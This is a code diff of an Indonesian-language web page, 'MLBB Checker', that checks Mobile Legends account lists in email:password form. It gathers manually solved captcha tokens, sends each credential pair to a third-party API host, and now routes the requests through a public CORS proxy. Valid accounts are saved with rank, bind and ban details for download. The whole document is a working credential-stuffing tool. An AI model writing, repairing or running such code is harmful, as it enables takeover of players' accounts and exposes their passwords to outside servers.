@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MLBB Checker FinalBoss</title>
+    <title>MLBB Checker Integrated FinalBOSS</title>
     <script src="https://cstaticdun.126.net/load.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
     <style>
@@ -52,18 +52,26 @@
 
     <div class="main-container">
         <div class="panel captcha-solver-panel"><div class="card"><div class="card-title"><span><i class="fas fa-shield-alt"></i> Captcha Solver</span><span class="token-counter">Tokens: <span id="tokenCount">0</span></span></div><p style="font-size:0.8rem;color:var(--text-muted);margin-bottom:15px;">Selesaikan captcha untuk mengumpulkan token. Proses akan otomatis mengambil token dari sini.</p><div class="captcha-container"><div id="captcha1"></div></div><div class="captcha-container"><div id="captcha2"></div></div><div class="captcha-container"><div id="captcha3"></div></div></div></div>
+        
         <div class="panel control-panel"><div class="card"><h2 class="card-title"><i class="fas fa-cogs"></i> Kontrol & Input</h2><textarea id="accountList" rows="12" placeholder="Masukkan list akun di sini...&#10;Format: email:password"></textarea><div class="button-group"><button id="startButton"><i class="fas fa-play"></i> Mulai</button><button id="pauseButton" disabled><i class="fas fa-pause"></i> Jeda</button><button id="stopButton" disabled><i class="fas fa-stop"></i> Stop</button></div></div><div class="card"><h2 class="card-title"><i class="fas fa-chart-line"></i> Statistik</h2><div class="stats-grid"><div class="stat-item">Total: <span id="totalCount">0</span></div><div class="stat-item">Checked: <span id="checkedCount">0</span></div><div class="stat-item valid">Valid: <span id="validCount">0</span></div><div class="stat-item error">Error: <span id="errorCount">0</span></div></div></div></div>
+        
         <div class="panel results-panel"><div class="card"><h2 class="card-title"><i class="fas fa-tasks"></i> Hasil Pengecekan</h2><div id="resultsLog"><div class="log-item-simple info">Selamat datang! Selesaikan captcha, masukkan list akun, lalu klik 'Mulai'.</div></div><div class="download-buttons"><button id="downloadValidButton"><i class="fas fa-download"></i> Download Valid</button><button id="downloadOtherButton"><i class="fas fa-download"></i> Download Lainnya</button></div></div></div>
     </div>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
+            // --- Konfigurasi ---
             const REQUEST_DELAY_MS = 1000;
+            // URL PROXY UNTUK MENGATASI MASALAH "Failed to fetch" (CORS)
+            const CORS_PROXY = 'https://corsproxy.io/?'; 
+
+            // --- Variabel State ---
             let tokens = [];
             let accounts = [], currentIndex = 0, isChecking = false, isPaused = false, pausedForToken = false;
             let results = { valid: [], others: [] };
             let stats = { total: 0, checked: 0, valid: 0, error: 0 };
 
+            // --- Elemen DOM ---
             const accountListEl = document.getElementById('accountList');
             const startButton = document.getElementById('startButton');
             const pauseButton = document.getElementById('pauseButton');
@@ -74,9 +82,9 @@
             const tokenCountEl = document.getElementById('tokenCount');
             const counters = { total: document.getElementById('totalCount'), checked: document.getElementById('checkedCount'), valid: document.getElementById('validCount'), error: document.getElementById('errorCount') };
             
+            // --- LOGIC CAPTCHA ---
             const captchaKey = "fef5c67c39074e9d845f4bf579cc07af";
             const updateTokenCounter = () => { tokenCountEl.textContent = tokens.length; };
-
             function loadCaptcha(captchaId, elementId) {
                 initNECaptcha({
                     captchaId: captchaId, element: elementId, mode: "embed",
@@ -96,37 +104,18 @@
             }
             loadCaptcha(captchaKey, "#captcha1"); loadCaptcha(captchaKey, "#captcha2"); loadCaptcha(captchaKey, "#captcha3");
 
-            const logSimple = (message, type) => {
-                const logItem = document.createElement('div');
-                logItem.className = `log-item-simple ${type}`;
-                logItem.innerHTML = `<i class="fas fa-info-circle"></i> [${new Date().toLocaleTimeString()}] ${message}`;
-                resultsLogEl.appendChild(logItem);
-                resultsLogEl.scrollTop = resultsLogEl.scrollHeight;
-            };
-            
-            const createResultCard = (data, accountLine) => {
-                const isBanned = data.banned === 'True';
-                const card = document.createElement('div');
-                card.className = `log-card ${isBanned ? 'banned' : ''}`;
-                card.innerHTML = `<div class="log-summary"><div class="summary-main"><span class="ign">${data.ign||'N/A'}</span><span class="rank">${data.rank||'N/A'}</span></div><span class="details-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="log-details"><div class="detail-item"><span class="detail-label">Akun</span><span class="detail-value">${accountLine}</span></div><div class="detail-item"><span class="detail-label">Level</span><span class="detail-value">${data.level||'N/A'}</span></div><div class="detail-item"><span class="detail-label">Highest Rank</span><span class="detail-value">${data.highest_rank||'N/A'}</span></div><div class="detail-item"><span class="detail-label">ID (Zone)</span><span class="detail-value">${data.role_id||'N/A'} (${data.zone_id||'N/A'})</span></div><div class="detail-item"><span class="detail-label">Binds</span><span class="detail-value">${data.binds||'N/A'}</span></div><div class="detail-item"><span class="detail-label">Banned</span><span class="detail-value ${isBanned?'banned-true':''}">${data.banned} ${isBanned?`(Hingga: ${data.ban_expiry})`:''}</span></div></div>`;
-                resultsLogEl.appendChild(card);
-                resultsLogEl.scrollTop = resultsLogEl.scrollHeight;
-            };
-
+            // --- FUNGSI CHECKER ---
+            const logSimple = (message, type) => { const logItem = document.createElement('div'); logItem.className = `log-item-simple ${type}`; logItem.innerHTML = `<i class="fas fa-info-circle"></i> [${new Date().toLocaleTimeString()}] ${message}`; resultsLogEl.appendChild(logItem); resultsLogEl.scrollTop = resultsLogEl.scrollHeight; };
+            const createResultCard = (data, accountLine) => { const isBanned = data.banned === 'True'; const card = document.createElement('div'); card.className = `log-card ${isBanned ? 'banned' : ''}`; card.innerHTML = `<div class="log-summary"><div class="summary-main"><span class="ign">${data.ign||'N/A'}</span><span class="rank">${data.rank||'N/A'}</span></div><span class="details-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="log-details"><div class="detail-item"><span class="detail-label">Akun</span><span class="detail-value">${accountLine}</span></div><div class="detail-item"><span class="detail-label">Level</span><span class="detail-value">${data.level||'N/A'}</span></div><div class="detail-item"><span class="detail-label">Highest Rank</span><span class="detail-value">${data.highest_rank||'N/A'}</span></div><div class="detail-item"><span class="detail-label">ID (Zone)</span><span class="detail-value">${data.role_id||'N/A'} (${data.zone_id||'N/A'})</span></div><div class="detail-item"><span class="detail-label">Binds</span><span class="detail-value">${data.binds||'N/A'}</span></div><div class="detail-item"><span class="detail-label">Banned</span><span class="detail-value ${isBanned?'banned-true':''}">${data.banned} ${isBanned?`(Hingga: ${data.ban_expiry})`:''}</span></div></div>`; resultsLogEl.appendChild(card); resultsLogEl.scrollTop = resultsLogEl.scrollHeight; };
             const updateStats = () => Object.keys(stats).forEach(key => counters[key].textContent = stats[key]);
             const setButtonsState = (start, pause, stop) => { startButton.disabled = !start; pauseButton.disabled = !pause; stopButton.disabled = !stop; };
-            
-            const fullReset = () => {
-                setButtonsState(true, false, false);
-                pauseButton.innerHTML = '<i class="fas fa-pause"></i> Jeda';
-            };
+            const fullReset = () => { setButtonsState(true, false, false); pauseButton.innerHTML = '<i class="fas fa-pause"></i> Jeda'; };
             
             const checkNextAccount = async () => {
                 if (!isChecking || isPaused) return;
                 if (currentIndex >= accounts.length) {
                     logSimple('🎉 Pengecekan Selesai Semua!', 'info');
-                    fullReset();
-                    return;
+                    fullReset(); return;
                 }
                 if (tokens.length === 0) {
                     logSimple('<b>Token habis! Selesaikan captcha di sebelah kiri untuk melanjutkan...</b>', 'error');
@@ -139,8 +128,12 @@
                 updateTokenCounter();
                 
                 logSimple(`[${stats.checked + 1}/${stats.total}] Mengecek: ${email}...`, 'info');
-                const endpoint = `https://suneoxjarell.x10.bz/accountmtapi/connect?user=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}&captcha=${token}`;
                 
+                const apiUrl = `https://suneoxjarell.x10.bz/accountmtapi/connect?user=${encodeURIComponent(email)}&pw=${encodeURIComponent(password)}&captcha=${token}`;
+                const endpoint = CORS_PROXY + apiUrl;
+                
+                console.log("Mencoba fetch ke:", endpoint);
+
                 try {
                     const response = await fetch(endpoint);
                     if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
@@ -148,48 +141,22 @@
                     processApiResponse(data, accountLine);
                 } catch (e) {
                     stats.error++; results.others.push(`${accountLine} | [NETWORK/FETCH ERROR]`);
-                    logSimple(`Error pada ${accountLine}: ${e.message}`, 'error');
+                    logSimple(`Error pada ${email}: ${e.message}. Kemungkinan masalah CORS atau jaringan.`, 'error');
                 } finally {
                     stats.checked++; currentIndex++; updateStats();
                     setTimeout(checkNextAccount, REQUEST_DELAY_MS);
                 }
             };
 
-            const processApiResponse = (data, accountLine) => {
-                if (data.status === 'valid') {
-                    stats.valid++;
-                    results.valid.push(`${accountLine} | IGN: ${data.ign} | Rank: ${data.rank} | Banned: ${data.banned}`);
-                    createResultCard(data, accountLine);
-                } else {
-                    stats.error++;
-                    const message = data.message || JSON.stringify(data);
-                    results.others.push(`${accountLine} | [${message}]`);
-                    logSimple(`Gagal - ${accountLine} -> Pesan: ${message}`, 'error');
-                }
-            };
+            const processApiResponse = (data, accountLine) => { if (data.status === 'valid') { stats.valid++; results.valid.push(`${accountLine} | IGN: ${data.ign} | Rank: ${data.rank} | Banned: ${data.banned}`); createResultCard(data, accountLine); } else { stats.error++; const message = data.message || JSON.stringify(data); results.others.push(`${accountLine} | [${message}]`); logSimple(`Gagal - ${accountLine} -> Pesan: ${message}`, 'error'); } };
             
-            // --- LOGIKA UTAMA YANG DIPERBAIKI ---
+            // --- Event Listener ---
             startButton.addEventListener('click', () => {
                 const parsedAccounts = accountListEl.value.split(/[\r\n]+/).filter(line => line.trim() !== '');
-
-                console.clear();
-                console.log(`[DIAGNOSTIK] Tombol Mulai Ditekan.`);
-                console.log(`[DIAGNOSTIK] Ditemukan ${parsedAccounts.length} akun setelah parsing.`);
-                console.log(`[DIAGNOSTIK] Ditemukan ${tokens.length} token yang tersedia.`);
-
-                if (parsedAccounts.length === 0) {
-                    logSimple('GAGAL MEMULAI: List akun kosong atau formatnya salah.', 'error');
-                    alert('List akun kosong atau formatnya salah!');
-                    return;
-                }
-                if (tokens.length === 0) {
-                    logSimple('GAGAL MEMULAI: Token CAPTCHA kosong.', 'error');
-                    alert('Selesaikan minimal satu captcha terlebih dahulu!');
-                    return;
-                }
+                if (parsedAccounts.length === 0) { logSimple('GAGAL MEMULAI: List akun kosong atau formatnya salah.', 'error'); alert('List akun kosong atau formatnya salah!'); return; }
+                if (tokens.length === 0) { logSimple('GAGAL MEMULAI: Token CAPTCHA kosong.', 'error'); alert('Selesaikan minimal satu captcha terlebih dahulu!'); return; }
                 
-                // INISIALISASI STATE BARU (BUKAN RESET)
-                accounts = parsedAccounts; // PENTING: Gunakan variabel yang baru diparsing
+                accounts = parsedAccounts;
                 currentIndex = 0;
                 isChecking = true;
                 isPaused = false;
@@ -204,46 +171,12 @@
                 checkNextAccount();
             });
 
-            pauseButton.addEventListener('click', () => {
-                if (!isChecking) return;
-                isPaused = !isPaused; pausedForToken = false;
-                pauseButton.innerHTML = isPaused ? '<i class="fas fa-play"></i> Lanjut' : '<i class="fas fa-pause"></i> Jeda';
-                logSimple(isPaused ? 'Proses dijeda oleh pengguna.' : 'Proses dilanjutkan...', 'info');
-                if (!isPaused) checkNextAccount();
-            });
-
-            stopButton.addEventListener('click', () => {
-                isChecking = false; // Hentikan loop
-                logSimple('Proses dihentikan oleh pengguna.', 'error');
-                fullReset();
-            });
-
-            // Sisa event listener lainnya (download, expand card)
-            resultsLogEl.addEventListener('click', (e) => {
-                const summary = e.target.closest('.log-summary');
-                if (summary) {
-                    const details = summary.nextElementSibling;
-                    const icon = summary.querySelector('.details-toggle i');
-                    const isExpanded = details.style.display === 'grid';
-                    details.style.display = isExpanded ? 'none' : 'grid';
-                    icon.className = isExpanded ? 'fas fa-chevron-down' : 'fas fa-chevron-up';
-                }
-            });
-            const downloadTxt = (filename, content) => {
-                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(blob);
-                link.download = filename;
-                link.click();
-            };
-            downloadValidButton.addEventListener('click', () => {
-                if (results.valid.length === 0) return alert('Tidak ada akun valid untuk diunduh.');
-                downloadTxt('akun_valid.txt', results.valid.join('\n'));
-            });
-            downloadOtherButton.addEventListener('click', () => {
-                if (results.others.length === 0) return alert('Tidak ada data akun lain untuk diunduh.');
-                downloadTxt('akun_lainnya.txt', results.others.join('\n'));
-            });
+            pauseButton.addEventListener('click', () => { if (!isChecking) return; isPaused = !isPaused; pausedForToken = false; pauseButton.innerHTML = isPaused ? '<i class="fas fa-play"></i> Lanjut' : '<i class="fas fa-pause"></i> Jeda'; logSimple(isPaused ? 'Proses dijeda oleh pengguna.' : 'Proses dilanjutkan...', 'info'); if (!isPaused) checkNextAccount(); });
+            stopButton.addEventListener('click', () => { isChecking = false; logSimple('Proses dihentikan oleh pengguna.', 'error'); fullReset(); });
+            resultsLogEl.addEventListener('click', (e) => { const summary = e.target.closest('.log-summary'); if (summary) { const details = summary.nextElementSibling; const icon = summary.querySelector('.details-toggle i'); const isExpanded = details.style.display === 'grid'; details.style.display = isExpanded ? 'none' : 'grid'; icon.className = isExpanded ? 'fas fa-chevron-down' : 'fas fa-chevron-up'; } });
+            const downloadTxt = (filename, content) => { const blob = new Blob([content], { type: 'text/plain;charset=utf-8' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = filename; link.click(); };
+            downloadValidButton.addEventListener('click', () => { if (results.valid.length === 0) return alert('Tidak ada akun valid untuk diunduh.'); downloadTxt('akun_valid.txt', results.valid.join('\n')); });
+            downloadOtherButton.addEventListener('click', () => { if (results.others.length === 0) return alert('Tidak ada data akun lain untuk diunduh.'); downloadTxt('akun_lainnya.txt', results.others.join('\n')); });
         });
     </script>
 </body>
